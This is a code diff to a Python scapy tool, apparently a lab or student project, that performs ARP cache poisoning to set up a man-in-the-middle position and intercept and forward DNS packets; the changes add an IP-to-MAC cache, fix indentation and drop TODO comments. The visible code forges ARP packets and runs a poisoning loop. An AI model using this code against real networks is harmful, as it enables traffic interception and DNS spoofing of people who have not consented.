@@ -3,6 +3,7 @@ from Forward import *
 from DNS import *
 import threading
 from config import config
+from discovery import ip_mac_cache
 
 # Forges an ICMP echo request, used for Solaris systems
 # Creates an ARP entry for the [src_ip] on the destination device
@@ -27,7 +28,7 @@ def forge_arp_request(src_ip, src_mac, dst_ip, dst_mac):
 		psrc=src_ip,
 		pdst=dst_ip,
 		hwsrc=src_mac,
-    	hwdst="00:00:00:00:00:00"
+		hwdst="00:00:00:00:00:00"
 	)
 	
 def poison_loop(forged_packets, interface, iterations, stop_event):
@@ -89,9 +90,6 @@ def start_arp_mitm(group1, group2, self_mac, interface):
 
 	return thread, stop_event
 
-	# todo find good timings for sending poison/stealth mode(?) (base on OS?)
-
-    
 def stop_arp_mitm(thread, group1, group2, stop_event, interface):
 	print("Stopping ARP poisoning thread...")
 	# signal the poison thread to stop
@@ -123,19 +121,22 @@ def stop_arp_mitm(thread, group1, group2, stop_event, interface):
 	poison_loop(forged_packets, interface, 3, stop_event)
 
 # Gets the mac of the given ip by sending an arp broadcast
-# TODO: cache ip and mac pairs for faster mac return (optionally in discovery)
 def get_mac(ip, iface):
-    iface = iface
+	# If the ip mac pair is cached return it
+	if ip in ip_mac_cache:
+		return ip_mac_cache[ip]
 	
-    ans, _ = srp(
-        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
-        iface=iface,
-        timeout=2,
-        verbose=False
-    )
-    for _, rcv in ans:
-        return rcv[ARP].hwsrc
-    return None
+	ans, _ = srp(
+		Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
+		iface=iface,
+		timeout=2,
+		verbose=False
+	)
+	for _, rcv in ans:
+		mac = rcv[ARP].hwsrc
+		ip_mac_cache[ip] = mac
+		return mac
+	return None
 
 # Forwards a packet towards the destination by reconstructing its ethernet layer
 def forward_dns_pkt(pkt):
@@ -150,12 +151,12 @@ def forward_dns_pkt(pkt):
 	eth = Ether(src=get_if_hwaddr(iface), dst=mac)
 	sendp(eth / pkt[IP], iface=iface)
 	
-# Filter for DNS non-replayed DNS packets
+# Filter for non-replayed DNS packets
 def only_dns_request(pkt, self_mac):
-    return (
-        pkt.haslayer(DNS) and
+	return (
+	pkt.haslayer(DNS) and
 		pkt[Ether].src != self_mac
-    )
+	)
 
 def print_fn(pkt, interface):
 	if (pkt[DNS].qr == 0):
